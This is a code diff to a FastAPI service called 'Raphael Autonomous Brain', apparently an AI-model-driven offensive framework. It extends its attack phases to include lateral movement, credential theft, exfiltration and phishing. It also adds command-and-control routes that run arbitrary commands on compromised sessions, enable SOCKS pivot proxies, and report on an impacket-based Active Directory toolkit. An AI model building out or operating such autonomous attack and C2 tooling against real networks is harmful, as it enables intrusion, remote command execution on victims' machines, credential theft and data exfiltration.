@@ -12,14 +12,14 @@ from brain.adaptive_brain import AdaptiveBrain
 from brain.neural_memory import NeuralMemory, retrieve_episodic, store_episodic, store_target_profile, get_target_profile
 from brain.target_profiler import TargetProfiler
 from orchestrator.providers import call_model
-from brain.phases import PHASE_EXECUTORS, Finding, PhaseResult
+from orchestrator.brain.phases import PHASE_EXECUTORS, Finding, PhaseResult
 
 app = FastAPI(title="Raphael Autonomous Brain", version="2.0.0")
 brain = AdaptiveBrain()
 memory = NeuralMemory()
 profiler = TargetProfiler()
 
-PHASES = ["recon", "scan", "exploit", "postex", "exfil", "phish"]
+PHASES = ["recon", "scan", "exploit", "postex", "lateral", "credential", "exfil", "phish"]
 
 
 class StartRequest(BaseModel):
@@ -221,6 +221,40 @@ async def health():
 # Register C2 channel routes
 from orchestrator.c2_channel import register_c2_routes
 register_c2_routes(app)
+
+# Register session/pivot routes
+@app.get("/v1/c2/sessions")
+async def c2_sessions():
+    from orchestrator.c2.manager import get_c2
+    c2 = get_c2()
+    sessions = await c2.refresh_sessions()
+    return {"sessions": [s.to_dict() for s in sessions], "count": len(sessions)}
+
+@app.post("/v1/c2/{session_id}/exec")
+async def c2_exec(session_id: str, command: str = "whoami"):
+    from orchestrator.c2.manager import get_c2
+    c2 = get_c2()
+    result = await c2.execute(session_id, command)
+    return {"session_id": session_id, "output": result.output[:5000], "error": result.error}
+
+@app.post("/v1/c2/{session_id}/socks")
+async def c2_socks(session_id: str, port: int = 0):
+    from orchestrator.c2.manager import get_c2
+    c2 = get_c2()
+    proxy = await c2.socks_enable(session_id, port)
+    return {"session_id": session_id, "proxy": proxy}
+
+@app.get("/v1/ad/status")
+async def ad_status():
+    from orchestrator.ad.toolkit import get_ad_toolkit
+    ad = get_ad_toolkit()
+    return {"impacket_available": ad.has_impacket}
+
+@app.get("/v1/pivot/status")
+async def pivot_status():
+    from orchestrator.pivot.manager import get_pivot
+    p = get_pivot()
+    return {"chain_length": p.chain_length, "deepest_proxy": p.deepest_proxy}
 
 # Register audit trail routes
 class AuditQueryRequest(BaseModel):
